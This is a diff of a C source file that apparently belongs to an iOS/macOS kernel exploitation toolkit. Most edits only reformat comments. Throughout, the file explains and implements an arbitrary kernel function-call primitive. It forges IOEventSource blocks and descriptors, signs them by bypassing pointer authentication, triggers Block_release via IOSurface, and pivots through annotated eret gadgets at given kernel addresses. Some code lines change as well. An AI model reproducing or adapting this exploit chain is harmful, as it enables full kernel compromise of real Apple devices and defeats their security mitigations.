@@ -34,47 +34,35 @@
 
 
 ///
-/// This module allows calling aribitary kernel functions with controlled values in
-/// registers x0 - x30, sp and q0 - q31. To achieve this, the implementation uses
-/// a three link chain
+/// This module provides functionality for calling aribitary kernel functions with controlled values in
+/// registers x0 - x30, sp and q0 - q31. To achieve this, the implementation uses a three link chain
 ///
-/// Link 0:- This link works by creating fake `IOEventSource` instances with fake
-/// blocks assigned to`event->actionBlock` pointer. These fake blocks uses
-/// small block descriptors and have `BLOCK_HAS_COPY_DISPOSE` flag
-/// set. The fake blocks' `block->descriptor` value will be pointing to a fake small
-/// descriptor. This descriptor will have `desc->dispose` value adjusted to point to
-/// arbitary kernel functions. The PACDA vulnerability exploited in `utils/pacda.c`
-/// is used to sign the fake IOEventSource vtables and `block->descriptor` pointer.
-/// When the fake `IOEventSource` is released, the method `Block_release`
-/// will be called to release the fake `IOEventSource::actionBlock` which would
-/// call be dispose helper leading to arbitary kernel function execution. This
-/// link can only be used for calling very limited number of kernel functions
-/// since none of the arguments to the called function can be fully controlled.
-/// The first argument to the called function will always be a pointer to a kernel
-/// memory location (`struct Block_layout`) and we can have partial control over
-/// the data in this memory location (Apart from fields `block->flag` and
-/// `block->descriptor` no other fields are used when `Block_release` is called).
-/// With some modification we can get control over callee-saved saved registers
-/// by using the same techinique we used in the PACDA exploit `utils/pacda.c`.
-/// This link is used to call Link 1 with partially controlled values in memory pointed
-/// by x0 and controlled values in `x20` and `x21` registers
+/// Link 0 :- This link create fake small block descriptors with dispose helper function pointing
+/// to the entry point of link 1. Then it uses the functionality provided by `util/pacda.c` to sign
+/// and assign the fake small block descriptor as the `block_descriptor` of a Block. This block
+/// is assigned to `IOEventSource::actionBlock` and the `IOEventSource` is assigned as a value
+/// to the `props` dictionary is `IOSurface`. When the `IOSurfaceRemoveAllValues` method is
+/// called, the `IOEventSource::free` will be triggered, which will call `Block_release` to release
+/// the `IOEventSource::actionBlock`, which would call the dispose helper of the associated
+/// block descriptor, leading to program control getting directed to entry of Link 1. The technique
+/// used in `util/pacda.c` to get arbitary values in callee-saved registers is used in link 1 also to
+/// set the values of registers x20 and x21 before the `Block_release` function is triggered.
 ///
-/// Link 1: This link uses part of `arm64_thread_exception_return` to load values of
-/// registers `x0`, `x4` and `sp` from memory pointed by register `x0` and then it
-/// branches using `eret` instruction to the address in `x20` register. Link 0 will be
-/// setting the value of registers `x20 = entry point to Link 2`, `x21 = 0x40008` before
-/// calling Link 1. The reason for not using this link to directly call target function is
-/// because we only have partial controll over data in memory pointed by x0. Even
-/// though registers `x0 - x29`, `sp` and `q0-q31` are loaded from memory pointed by
-/// `x0`, not all of these values can be controlled due to overlap with the fields of
-/// `struct Block_layout`
+/// Link 1: This link uses part of `arm64_thread_exception_return` to load values of registers
+/// `x0`, `x4` and `sp` from memory pointed by register `x0` and then it branches using `eret`
+/// instruction to the address in `x20` register. Link 0 will be setting the value of registers
+/// `x20 = entry point to Link 2`, `x21 = 0x40008` before calling Link 1. The reason for not using
+/// this link to directly call target function is because we only have partial controll over data in
+/// memory pointed by x0 (The memory pointed by x0 is shared between `struct Block_layout`
+/// and `struct arm_context`). Even though registers `x0 - x29`, `sp` and `q0-q31` are loaded from
+/// memory pointed by `x0`, not all of these values can be controlled due to overlap with the
+/// fields of `struct Block_layout`
 ///
-/// Link 2: This link uses part of `hv_eret_to_guest` method to load the values of
-/// registers `x0 - x30` and `q0 - q31` from memory pointed by `x0` and then it uses
-/// `eret` instruction to branch to address in register `x4`. Both `x0` and `x4` registers
-/// are set with controlled values by Link 1, which allows us to call any arbitary
-/// kernel function with fully controlled `x0 - x30` and `q0 - q31` register values.
-///
+/// Link 2: This link uses part of `hv_eret_to_guest` method to load the values of registers `x0 - x30`
+/// and `q0 - q31` from memory pointed by `x0` and then it uses `eret` instruction to branch to
+/// address in register `x4`. Both `x0` and `x4` registers are set with controlled values by Link 1,
+/// which allows us to call any arbitary kernel function with fully controlled `x0 - x30` and `q0 - q31`
+/// register values.
 ///
 
 
@@ -125,8 +113,8 @@ enum {
 ///     // imported variables
 /// };
 ///
-/// The flag `BLOCK_HAS_COPY_DISPOSE` will be set on the block when the block has
-/// a copy / dispose helper and the associated block descriptor stores reference to these
+/// The flag `BLOCK_HAS_COPY_DISPOSE` will be set on the block when the block has a
+/// copy / dispose helper and the associated block descriptor stores reference to these
 /// synthesized helper functions. When the block is using small descriptor format, the flag
 /// `BLOCK_SMALL_DESCRIPTOR` is set and the descriptor will be of following format
 ///
@@ -139,8 +127,8 @@ enum {
 ///     /* copy & dispose are optional, only access them if
 ///     *        Block_layout->flags & BLOCK_HAS_COPY_DIPOSE */
 ///
-///     // ***NOTE***: This 32-bit integers stores the relative offset to the function from
-///     //                      address of the respective field.
+///     // ***NOTE***: This 32-bit integers stores the relative offset to the helper function from
+///     //                      their address.
 ///     int32_t copy;
 ///     int32_t dispose;
 /// };
@@ -171,9 +159,9 @@ enum {
 ///     }
 /// }
 ///
-/// The `_Block_call_dispose_helper` method calls `_Block_get_dispose_function` method
-/// to compute the address of the dispose helper function and then it calls that function as
-/// shown below:
+/// The `_Block_call_dispose_helper` method calls `_Block_get_dispose_function` method to
+/// compute the address of the dispose helper function and then it calls that function as shown
+/// below:
 ///
 /// static void
 /// _Block_call_dispose_helper(struct Block_layout *aBlock)
@@ -207,15 +195,18 @@ enum {
 ///     return _Block_get_dispose_fn(bd2);
 /// }
 ///
-/// The `_Block_get_relative_function_pointer` computes the address of dispose helper by
-/// adding the address of field `desc->dispose` with value of `desc->dispose`. The resulting
-/// value is signed using IA pointer authentication key by calling the method
-/// `ptrauth_sign_unauthenticated` as shown below:
+/// The `_Block_get_relative_function_pointer` computes the address of dispose helper by adding
+/// the address of field `desc->dispose` with value of `desc->dispose`. The resulting value is
+/// signed using IA pointer authentication key by calling the method `ptrauth_sign_unauthenticated`
+/// as shown below:
 ///
 /// #define _Block_get_relative_function_pointer(field, type)           \
 ///     ((type)ptrauth_sign_unauthenticated(                              \
 ///         (void *)((uintptr_t)(intptr_t)(field) + (uintptr_t)&(field)), \
 ///         ptrauth_key_function_pointer, 0))
+///
+/// The `Block_release` method will call the function pointed by this signed pointer with first
+/// argument (x0) equal to address of `struct Block_layout`
 ///
 /// To prevent an attacker from modifying the `copy` or `dispose` field of the descriptor of a
 /// block using small descriptor format and achieving arbitary kernel function execution, the
@@ -229,19 +220,19 @@ enum {
 ///   block descriptor and assigning it to `block->descriptor`.
 ///
 /// Since we already have a method to sign aribitary pointers with arbitary context using DA
-/// authenication key (See util/pacda.c), we can bypass the 2nd defense and create fake
-/// small block descriptors, sign and assign them to `block->descriptor` field and trigger their
-/// dispose helper functions by triggering the `_Block_release` function of the associated
-/// block to achive arbitary kernel function execution.
+/// authenication key (See util/pacda.c), we can bypass the 2nd defense and create fake small
+/// block descriptors, sign and assign them to `block->descriptor` field and trigger their dispose
+/// helper functions by triggering the `Block_release` function of the associated block to achive
+/// arbitary kernel function execution.
 ///
-/// To trigger the `Block_release` method from user land, we create fake `IOEventSource`
-/// with `event_source->actionBlock` pointing to the fake block. Then we will create a
-/// new `IOSurface` using `IOSurfaceCreate` method and we will add the fake event source
-/// as a value to a key in the `props` dictionary (Dictionary which stores the key value pairs
-/// set using `IOSurfaceSetValue` method) of the `IOSurface`. Then we will  call
-/// `IOSurfaceRemoveValue` method to remove the fake event source, which will trigger
-/// the `Block_release` function. The `Block_release` function will trigger the dispose helper
-/// of the fake block leading to arbitary kernel function execution.
+/// To trigger the `Block_release` method from user land, we create fake `IOEventSource` with
+/// `event_source->actionBlock` pointing to the fake block. Then we will create a new `IOSurface`
+/// using `IOSurfaceCreate` method and we will add the fake event source as a value to a key in
+/// the `props` dictionary (Dictionary which stores the key value pairs set using `IOSurfaceSetValue`
+/// method) of the `IOSurface`. Then we will  call `IOSurfaceRemoveValue` method to remove
+/// the fake event source, which will trigger the `Block_release` function. The `Block_release`
+/// function will trigger the dispose helper of the fake block leading to arbitary kernel function
+/// execution.
 ///
 /// Since the Link 1 also requires control over registers `x20` and `x21`, we will use the techinque
 /// used in `utils/pacda.c` to load callee-saved registers with controlled values when they are
@@ -410,7 +401,7 @@ void xe_util_kfunc_link0_prepare_fake_block(link0_t link0, const struct arm_cont
 
 
 uintptr_t xe_util_kfunc_get_lr_unregister_event_source(void) {
-    /// Get the link register for branch with link call to `IOStatistics::unregisterEventSource`
+    /// Get the link register value for branch with link call to `IOStatistics::unregisterEventSource`
     /// from method `IOEventSource::free`
     uintptr_t lr_unregister_event_source = xe_slider_kernel_slide(FUNC_IO_EVENT_SOURCE_FREE_ADDR) + LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_OFFSET;
     
@@ -422,7 +413,7 @@ uintptr_t xe_util_kfunc_get_lr_unregister_event_source(void) {
 
 
 uintptr_t xe_util_kfunc_get_lr_is_io_connect_method(void) {
-    /// Get the link register for branch with link call to `is_io_connect_method` from
+    /// Get the link register value for branch with link call to `is_io_connect_method` from
     /// method `_Xio_connect_method`
     uintptr_t lr_is_io_connect_method = xe_slider_kernel_slide(FUNC_XIO_CONNECT_METHOD_ADDR) + LR_IS_IO_CONNECT_METHOD_OFFSET;
     
@@ -433,7 +424,7 @@ uintptr_t xe_util_kfunc_get_lr_is_io_connect_method(void) {
 
 
 uintptr_t xe_util_kfunc_get_lr_block_dispose_helper(void) {
-    /// Get the link register for branch with link call to dispose helper from
+    /// Get the link register value for branch with link call to dispose helper from
     /// `Block_release` method
     uintptr_t lr_block_dispose_helper = xe_slider_kernel_slide(FUNC_BLOCK_RELEASE_ADDR) + LR_BLOCK_RELEASE_DISPOSE_HELPER_OFFSET;
     
@@ -506,7 +497,7 @@ struct xe_util_kfunc_register_state xe_util_kfunc_link0_pre_execute(link0_t link
     
     /// Wait until `IOStatistics::unregisterEventSource` method tries to acquire `IOStatistics::lock`
     /// by calling `IORWLockWrite` method
-    error = xe_util_lck_rw_wait_for_contention(iostatistics_lock, *waiting_thread, 0, NULL);
+    error = xe_util_lck_rw_wait_for_contention(iostatistics_lock, *waiting_thread, NULL);
     xe_assert_err(error);
     
     struct xe_util_kfunc_register_state register_state;
@@ -584,43 +575,50 @@ void xe_util_kfunc_link0_destroy(link0_t link0) {
 
 
 // MARK: - Link 1
-/// This link is called by link 0 with x20 = <entry point to link 2> and x21 = 0x40008
-/// The memory pointed by x0 is only partially controlled because it is shared by
-/// `struct Block_layout` and `struct arm_context`
+/// This link is called by link 0 with x20 = <entry point to link 2> and x21 = 0x40008. The memory
+/// pointed by x0 is only partially controlled because it is shared by `struct Block_layout` and
+/// `struct arm_context`
 ///
 /// The memory pointed by x0 is saved with `struct arm_context` to set value of
-/// x4 = target function address and x0 = address of `struct arm_context` with fully
-/// controlled data
+/// x4 = target function address and x0 = address of `struct arm_context` with fully controlled data
 ///
 ///
-/// kernel.release.t6000(21E230)`arm64_thread_exception_return:
-/// 0xfffffe0007253be8      mov    x0, sp
-/// ...
-/// 0xfffffe0007253c1c      bl     ml_check_signed_state
-/// 0xfffffe0007253c20      mov    x1, x20                           => ENTRY POINT to the link
-/// 0xfffffe0007253c24      mov    x2, x21
-/// 0xfffffe0007253c28      msr    SPSel, #0x0
-/// 0xfffffe0007253c2c      mov    x30, x3
-/// 0xfffffe0007253c30      mov    x3, x22
-/// 0xfffffe0007253c34      mov    x4, x23
-/// 0xfffffe0007253c38      mov    x5, x24
-/// 0xfffffe0007253c3c      ldr      w3, [sp, #0x340]
-/// 0xfffffe0007253c40      ldr      w4, [sp, #0x344]
-/// 0xfffffe0007253c44      msr    ELR_EL1, x1                   => ELR_EL1 loaded from x1 which is loaded from x20
-/// 0xfffffe0007253c48      msr    SPSR_EL1, x2                => SPSR_EL1 loaded from x2 which is loaded from x21
-/// ...
-/// 0xfffffe0007253cd4      ldp    q0, q1, [x0, #0x140]
-/// ...
-/// 0xfffffe0007253d10      ldp    q30, q31, [x0, #0x320]      _
-/// 0xfffffe0007253d14      ldp    x2, x3, [x0, #0x18]              |
-/// ...                                                                                      |
-/// 0xfffffe0007253d40      ldp    x26, x27, [x0, #0xd8]          |
-/// 0xfffffe0007253d44      ldr    x28, [x0, #0xe8]                   | > Registers x0 - x29 and sp loaded from `struct arm_context`
-/// 0xfffffe0007253d48      ldr    x29, [x0, #0xf0]                    |    in memory pointed by x0
-/// 0xfffffe0007253d4c      ldr    x1, [x0, #0x100]                   |
-/// 0xfffffe0007253d50      mov    sp, x1                                |
-/// 0xfffffe0007253d54      ldp    x0, x1, [x0, #0x8]             _ |
-/// 0xfffffe0007253d58      eret                                           =>   Restores PSTATE from SPSR_EL1 and branches to ELR_EL1
+//  kernel.release.t6000(21E230)`arm64_thread_exception_return:
+//  0xfffffe0007253be8      mov    x0, sp
+//  ...
+//  0xfffffe0007253c1c      bl     ml_check_signed_state
+/// // ***NOTE*** This is the ENTRY POINT to link 1
+//  0xfffffe0007253c20      mov    x1, x20
+//  0xfffffe0007253c24      mov    x2, x21
+//  0xfffffe0007253c28      msr    SPSel, #0x0
+//  0xfffffe0007253c2c      mov    x30, x3
+//  0xfffffe0007253c30      mov    x3, x22
+//  0xfffffe0007253c34      mov    x4, x23
+//  0xfffffe0007253c38      mov    x5, x24
+//  0xfffffe0007253c3c      ldr    w3, [sp, #0x340]
+//  0xfffffe0007253c40      ldr    w4, [sp, #0x344]
+/// // ***NOTE***: ELR_EL1 loaded from x1 which is loaded from x20
+//  0xfffffe0007253c44      msr    ELR_EL1, x1
+/// // ***NOTE***: SPSR_EL1 loaded from x2 which is loaded from x21
+// 0xfffffe0007253c48       msr    SPSR_EL1, x2
+//  ...
+//  0xfffffe0007253cd4      ldp    q0, q1, [x0, #0x140]
+//  ...
+//  0xfffffe0007253d10      ldp    q30, q31, [x0, #0x320]
+/// // Registers x0 - x29 and sp loaded from `struct arm_context` in memory pointed by x0
+//  0xfffffe0007253d14      ldp    x2, x3, [x0, #0x18]
+//  ...
+//  0xfffffe0007253d40      ldp    x26, x27, [x0, #0xd8]
+//  0xfffffe0007253d44      ldr    x28, [x0, #0xe8]
+//  0xfffffe0007253d48      ldr    x29, [x0, #0xf0]
+//  0xfffffe0007253d4c      ldr    x1, [x0, #0x100]
+//  0xfffffe0007253d50      mov    sp, x1
+//  0xfffffe0007253d54      ldp    x0, x1, [x0, #0x8]
+/// // ***NOTE***: Restores PSTATE from SPSR_EL1 and branches to ELR_EL1
+//  0xfffffe0007253d58      eret
+///
+/// This link will call Link 2 with value in value in register x4 set to target kernel function to be
+/// called, and  value in x0 pointing to a fully controlled location in kernel memory
 ///
 
 
@@ -633,20 +631,17 @@ typedef struct link1 {
 void xe_util_kfunc_link1_init(link1_t link1) {
     static_assert(offsetof(struct arm_context, ss.uss.x[0]) == TYPE_BLOCK_LAYOUT_MEM_FLAGS_OFFSET, "");
     
-    /// As noted in the discussion above, when Link 1 is executed the data in
-    /// memory pointed by `x0` is shared between `struct Block_layout` and
-    /// `struct arm_context`. The values of members `flags` and `descriptor`
-    /// in `struct Block_layout` must be controlled so that `Block_release` will
-    /// call the dispose helper of the block. We also need the value of `x[0]` in
-    /// `struct arm_context` to point to memory location with fully controlled
-    /// data. Since the memory for `context->x[0]` and `desc->flags` overlaps,
-    /// we need to set a value in this memory location such that both of them
-    /// are valid. This means we need the address for fully controlled data to
-    /// have its LSB part equal to `desc->flags` value. The flag `BLOCK_IS_GLOBAL`
-    /// is the flag we need to control with largest bit position (1 << 28). So
-    /// if we allocate a memory with size (1 << 30) we can always find an
-    /// address inside the allocated memory that will have the required flags
-    /// value
+    /// As noted in the discussion above, when Link 1 is executed the data in memory pointed
+    /// by `x0` is shared between `struct Block_layout` and `struct arm_context`. The values of
+    /// members `flags` and `descriptor` in `struct Block_layout` must be controlled so that
+    /// `Block_release` will call the dispose helper of the block. We also need the value of `x[0]`
+    /// in `struct arm_context` to point to memory location with fully controlled data. Since the
+    /// memory for `context->x[0]` and `desc->flags` overlaps, we need to set a value in this
+    /// memory location such that both of them are valid. This means we need the address for
+    /// fully controlled data to have its LSB part equal to `desc->flags` value. The flag
+    /// `BLOCK_IS_GLOBAL` is the flag we need to control with largest bit position (1 << 28).
+    /// So if we allocate a memory with size (1 << 30) we can always find an address inside the
+    /// allocated memory that will have the required flags value
     size_t allocation_size = (1ULL << 30);
     
     uintptr_t ptr;
@@ -667,18 +662,16 @@ void xe_util_kfunc_link1_init(link1_t link1) {
     /// Set the flags to the address
     x0 |= flags;
     
-    /// Set the block deallocating flag. We will increment this value by 1
-    /// before assigning it to memory location of `block->flags` member
-    /// which will clear this flag
+    /// Set the block deallocating flag. We will increment this value by 1 before assigning it to
+    /// memory location of `block->flags` member which will clear this flag
     x0 |= BLOCK_DEALLOCATING;
     
     xe_assert_cond(x0, >=, ptr);
     xe_assert_cond(x0 + sizeof(struct arm_context), <, ptr + ERET2_ARGS_SIZE);
     
-    /// The controlled data should still be stored at the address with flag
-    /// `BLOCK_DEALLOCATING` set because the method `Block_release`
-    /// will decrement the reference count and set this flag before calling the
-    /// dispose helper
+    /// The controlled data should still be stored at the address with flag `BLOCK_DEALLOCATING`
+    /// set because the method `Block_release` will decrement the reference count and set this
+    /// flag before calling the dispose helper
     link1->x0_arm_context = x0;
 }
 
@@ -700,17 +693,16 @@ struct link1_requirements xe_util_kfunc_link1_prepare(link1_t link1, uintptr_t t
     struct link1_requirements req;
     bzero(&req, sizeof(req));
     
-    /// Value for ELR_EL1. The Link 1 will branch to this address using
-    /// `eret` instruction after register values are loaded from memory
-    /// pointed by `x0`
+    /// Value for ELR_EL1. The Link 1 will branch to this address using `eret` instruction after
+    /// register values are loaded from memory pointed by `x0`
     req.x20 = target_func;
-    /// Value for SPSR_EL1. `PSTATE` will be restored to this value before
-    /// `eret` branches to `ELR_EL1`
+    /// Value for SPSR_EL1. `PSTATE` will be restored to this value before `eret` branches to
+    /// `ELR_EL1`
     req.x21 = 0x400008;
     
     static_assert(offsetof(struct arm_context, ss.uss.x[0]) == TYPE_BLOCK_LAYOUT_MEM_FLAGS_OFFSET, "");
-    /// Incrementing the x0_arm_context address by 1 because this will be decremented
-    /// by `Block_release` before dispose helper is called
+    /// Incrementing the x0_arm_context address by 1 because this will be decremented by
+    /// `Block_release` before dispose helper is called
     req.x0_data.ss.uss.x[0] = link1->x0_arm_context + 1;
     req.x0_data.ss.uss.x[4] = x4;
     req.x0_data.ss.uss.sp = sp;
@@ -741,47 +733,56 @@ void xe_util_kfunc_link1_destroy(link1_t link1) {
 
 
 // MARK: - Link 2
-/// Call an arbitary kernel function with control over registers x0-x30 and q0-q31
 ///
+/// This link is called by Link 1 with value of register x4 set to address of kernel function to be
+/// executed and value of x0 set to address of struct arm_context from which register values must
+/// be loaded
 ///
-/// kernel.release.t6000(21E230)`hv_eret_to_guest:
-/// 0xfffffe000725efdc      ldr    w1, [x0, #0x340]
-/// ...
-/// 0xfffffe000725f098      msr    SPSR_EL1, x3
-/// 0xfffffe000725f09c      msr    ELR_EL1, x4                 _    => ENTRY POINT, loads ELR_EL1 from x1
-/// 0xfffffe000725f0a0      ldp    q0, q1, [x0, #0x140]         |
-/// 0xfffffe000725f0a4      ldp    q2, q3, [x0, #0x160]         |
-/// 0xfffffe000725f0a8      ldp    q4, q5, [x0, #0x180]         |
-/// 0xfffffe000725f0ac      ldp    q6, q7, [x0, #0x1a0]         |
-/// 0xfffffe000725f0b0      ldp    q8, q9, [x0, #0x1c0]         |
-/// 0xfffffe000725f0b4      ldp    q10, q11, [x0, #0x1e0]     |
-/// 0xfffffe000725f0b8      ldp    q12, q13, [x0, #0x200]     |
-/// 0xfffffe000725f0bc      ldp    q14, q15, [x0, #0x220]     | >    Loads q0 - q31 from `struct arm_context` in memory
-/// 0xfffffe000725f0c0      ldp    q16, q17, [x0, #0x240]     |       pointed by x0
-/// 0xfffffe000725f0c4      ldp    q18, q19, [x0, #0x260]     |
-/// 0xfffffe000725f0c8      ldp    q20, q21, [x0, #0x280]     |
-/// 0xfffffe000725f0cc      ldp    q22, q23, [x0, #0x2a0]     |
-/// 0xfffffe000725f0d0      ldp    q24, q25, [x0, #0x2c0]     |
-/// 0xfffffe000725f0d4      ldp    q26, q27, [x0, #0x2e0]     |
-/// 0xfffffe000725f0d8      ldp    q28, q29, [x0, #0x300]     |
-/// 0xfffffe000725f0dc      ldp    q30, q31, [x0, #0x320]   _|
-/// 0xfffffe000725f0e0      ldp    x2, x3, [x0, #0x18]           |
-/// 0xfffffe000725f0e4      ldp    x4, x5, [x0, #0x28]           |
-/// 0xfffffe000725f0e8      ldp    x6, x7, [x0, #0x38]           |
-/// 0xfffffe000725f0ec      ldp    x8, x9, [x0, #0x48]           |
-/// 0xfffffe000725f0f0       ldp    x10, x11, [x0, #0x58]       |
-/// 0xfffffe000725f0f4       ldp    x12, x13, [x0, #0x68]       |
-/// 0xfffffe000725f0f8       ldp    x14, x15, [x0, #0x78]       | >     Loads x0-x30 from `struct arm_context` in memory
-/// 0xfffffe000725f0fc       ldp    x16, x17, [x0, #0x88]       |        pointed by x0
-/// 0xfffffe000725f100      ldp    x18, x19, [x0, #0x98]       |
-/// 0xfffffe000725f104      ldp    x20, x21, [x0, #0xa8]       |
-/// 0xfffffe000725f108      ldp    x22, x23, [x0, #0xb8]       |
-/// 0xfffffe000725f10c      ldp    x24, x25, [x0, #0xc8]       |
-/// 0xfffffe000725f110      ldp    x26, x27, [x0, #0xd8]       |
-/// 0xfffffe000725f114      ldr    x28, [x0, #0xe8]                |
-/// 0xfffffe000725f118      ldp    x29, x30, [x0, #0xf0]        |
-/// 0xfffffe000725f11c      ldp    x0, x1, [x0, #0x8]          _ |
-/// 0xfffffe000725f120      eret                                              =>  Branches to ELR_EL1. SPSR_EL1 reused from link 1
+//  kernel.release.t6000(21E230)`hv_eret_to_guest:
+//  0xfffffe000725efdc      ldr    w1, [x0, #0x340]
+//  ...
+//  0xfffffe000725f098      msr    SPSR_EL1, x3
+/// // ***NOTE***: ENTRY POINT to this link, loads ELR_EL1 from x4
+//  0xfffffe000725f09c      msr    ELR_EL1, x4
+/// // Loads q0 - q31 from `struct arm_context` in memory pointed by x0
+//  0xfffffe000725f0a0      ldp    q0, q1, [x0, #0x140]
+//  0xfffffe000725f0a4      ldp    q2, q3, [x0, #0x160]
+//  0xfffffe000725f0a8      ldp    q4, q5, [x0, #0x180]
+//  0xfffffe000725f0ac      ldp    q6, q7, [x0, #0x1a0]
+//  0xfffffe000725f0b0      ldp    q8, q9, [x0, #0x1c0]
+//  0xfffffe000725f0b4      ldp    q10, q11, [x0, #0x1e0]
+//  0xfffffe000725f0b8      ldp    q12, q13, [x0, #0x200]
+//  0xfffffe000725f0bc      ldp    q14, q15, [x0, #0x220]
+//  0xfffffe000725f0c0      ldp    q16, q17, [x0, #0x240]
+//  0xfffffe000725f0c4      ldp    q18, q19, [x0, #0x260]
+//  0xfffffe000725f0c8      ldp    q20, q21, [x0, #0x280]
+//  0xfffffe000725f0cc      ldp    q22, q23, [x0, #0x2a0]
+//  0xfffffe000725f0d0      ldp    q24, q25, [x0, #0x2c0]
+//  0xfffffe000725f0d4      ldp    q26, q27, [x0, #0x2e0]
+//  0xfffffe000725f0d8      ldp    q28, q29, [x0, #0x300]
+//  0xfffffe000725f0dc      ldp    q30, q31, [x0, #0x320]
+/// // Loads x0-x30 from `struct arm_context` in memory pointed by x0
+//  0xfffffe000725f0e0      ldp    x2, x3, [x0, #0x18]
+//  0xfffffe000725f0e4      ldp    x4, x5, [x0, #0x28]
+//  0xfffffe000725f0e8      ldp    x6, x7, [x0, #0x38]
+//  0xfffffe000725f0ec      ldp    x8, x9, [x0, #0x48]
+//  0xfffffe000725f0f0      ldp    x10, x11, [x0, #0x58]
+//  0xfffffe000725f0f4      ldp    x12, x13, [x0, #0x68]
+//  0xfffffe000725f0f8      ldp    x14, x15, [x0, #0x78]
+//  0xfffffe000725f0fc      ldp    x16, x17, [x0, #0x88]
+//  0xfffffe000725f100      ldp    x18, x19, [x0, #0x98]
+//  0xfffffe000725f104      ldp    x20, x21, [x0, #0xa8]
+//  0xfffffe000725f108      ldp    x22, x23, [x0, #0xb8]
+//  0xfffffe000725f10c      ldp    x24, x25, [x0, #0xc8]
+//  0xfffffe000725f110      ldp    x26, x27, [x0, #0xd8]
+//  0xfffffe000725f114      ldr    x28, [x0, #0xe8]
+//  0xfffffe000725f118      ldp    x29, x30, [x0, #0xf0]
+//  0xfffffe000725f11c      ldp    x0, x1, [x0, #0x8]
+/// // ***NOTE***:  Branches to address in ELR_EL1 (Loaded from x4). SPSR_EL1 reused from link 1
+//  0xfffffe000725f120      eret
+///
+/// This will call the arbitary kernel function to be executed with controlled values in registers
+/// x0 - x30 and q0 - q31
 ///
 
 typedef struct link2 {
@@ -800,9 +801,8 @@ struct link2_requirements {
     uint64_t pc;
 };
 
-/// Returns the values of registers `x4` and `pc` that must be set before Link  2
-/// is called. The memory pointed by `x0` must also be updated to `x0_data`
-/// before calling Link 2
+/// Returns the values of registers `x4` and `pc` that must be set before Link  2 is called. The
+/// memory pointed by `x0` must also be updated to `x0_data` before calling Link 2
 struct link2_requirements xe_util_kfunc_link2_prepare(link2_t link2, uintptr_t target_func, const uint64_t x[29], uint64_t fp, uint64_t lr, const uint128_t q[32]) {
     struct link2_requirements req;
     bzero(&req, sizeof(req));
